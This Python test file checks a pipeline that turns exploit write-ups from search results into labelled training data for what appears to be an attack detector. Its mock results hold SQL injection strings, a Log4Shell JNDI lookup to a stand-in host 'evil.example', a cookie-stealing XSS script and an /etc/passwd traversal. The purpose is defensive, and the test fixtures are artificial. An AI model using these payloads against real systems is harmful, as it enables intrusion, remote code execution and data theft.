"""
Offline test for the Tavily exploit-acquisition -> training-feed pipeline.

No API key and no network: the Tavily search call is monkeypatched with realistic PoC
results, so this proves extraction/normalization/feed-writing without any external calls.

    pytest tests/test_tavily_source.py
    python  tests/test_tavily_source.py     # standalone
"""
import os
import sys
import json
import tempfile
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from data_pipeline.tavily_source import TavilyExploitFeed

# Realistic Tavily 'results' with proof-of-concept payloads embedded in content/raw_content.
MOCK_RESULTS = [
    {"title": "CVE-2024-12345: Critical SQL injection in Acme CMS 3.2 (PHP 8.1)",
     "url": "https://example.com/a",
     "content": "A critical SQL injection. PoC: `?id=1 UNION SELECT username,password FROM users--`.",
     "raw_content": "also works: `' OR '1'='1`. Affects php 8.1 and laravel 10.",
     "published_date": "2026-08-01"},
    {"title": "Log4Shell-style RCE CVE-2024-22222 in a Java service (Apache 2.4)",
     "url": "https://example.com/b",
     "content": "Remote code execution via `${jndi:ldap://evil.example/a}` payload. log4j 2.14 vulnerable.",
     "raw_content": "", "published_date": "2026-08-02"},
    {"title": "Stored XSS CVE-2024-33333 in WordPress 6.5 plugin",
     "url": "https://example.com/c",
     "content": "Inject `<script>alert(document.cookie)</script>` into the comment field.",
     "raw_content": "", "published_date": "2026-08-03"},
    {"title": "Path traversal CVE-2024-44444 arbitrary file read (nginx)",
     "url": "https://example.com/d",
     "content": "Use `../../../../etc/passwd` to read arbitrary files.",
     "raw_content": "", "published_date": "2026-08-04"},
    {"title": "Vendor advisory: hardening TLS ciphers (no exploit)",
     "url": "https://example.com/e",
     "content": "General guidance on TLS configuration. No vulnerability.",
     "raw_content": "", "published_date": "2026-08-05"},
]


def _feed(tmp):
    f = TavilyExploitFeed(api_key="tvly-TEST", capture_path=Path(tmp) / "cap.jsonl",
                          feed_path=Path(tmp) / "feed.json")
    f._search = lambda q: MOCK_RESULTS          # monkeypatch network
    f.queries = ["q"]                            # one query so results aren't multiplied
    return f


def test_extracts_exploit_payloads():
    with tempfile.TemporaryDirectory() as tmp:
        intel, seeds = _feed(tmp).collect()
        cats = {s["category"] for s in seeds}
        assert "sql_injection" in cats
        assert "remote_code_execution" in cats      # log4shell jndi
        assert "cross_site_scripting" in cats
        assert "path_traversal" in cats
        joined = " ".join((s["query"] + s["body"]) for s in seeds)
        assert "UNION" in joined.upper()
        assert "jndi:ldap" in joined
        assert "etc/passwd" in joined


def test_advisories_have_cve_and_affected_tech():
    with tempfile.TemporaryDirectory() as tmp:
        intel, _ = _feed(tmp).collect()
        ids = {ti.cve_id for ti in intel}
        assert "CVE-2024-12345" in ids and "CVE-2024-22222" in ids
        aff = " ".join(a for ti in intel for a in ti.affected)
        assert "php" in aff and ("apache" in aff or "log4j" in aff)


def test_records_match_mlops_feed_shape():
    with tempfile.TemporaryDirectory() as tmp:
        f = _feed(tmp)
        _, seeds = f.collect()
        f.write_feed(seeds)
        rows = [json.loads(l) for l in f.capture_path.read_text().splitlines()]
        assert rows, "feed should not be empty"
        for r in rows:
            for k in ("method", "path", "query", "body", "label", "source_ip", "reviewed"):
                assert k in r, f"missing {k} (mlops_runner.load_reviewed_captures needs it)"
            assert r["label"] == 1 and r["reviewed"] is True
            assert r["source_ip"].startswith("threat-intel:tavily")


def test_augment_adds_volume_same_label():
    with tempfile.TemporaryDirectory() as tmp:
        f = _feed(tmp)
        _, seeds = f.collect()
        aug = f.augment(seeds, factor=4)
        assert len(aug) >= len(seeds)               # expanded
        assert all(a["label"] == 1 for a in aug)    # augmentation never changes labels


def test_write_feed_dedupes():
    with tempfile.TemporaryDirectory() as tmp:
        f = _feed(tmp)
        _, seeds = f.collect()
        first = f.write_feed(seeds)
        second = f.write_feed(seeds)                 # same payloads again
        assert first > 0 and second == 0


def test_disabled_without_key_is_safe():
    f = TavilyExploitFeed(api_key="")
    assert f.enabled is False
    intel, seeds = f.collect()
    assert intel == [] and seeds == []              # no key -> no-op, never raises


def _main():
    import pytest
    raise SystemExit(pytest.main([__file__, "-q"]))


if __name__ == "__main__":
    _main()
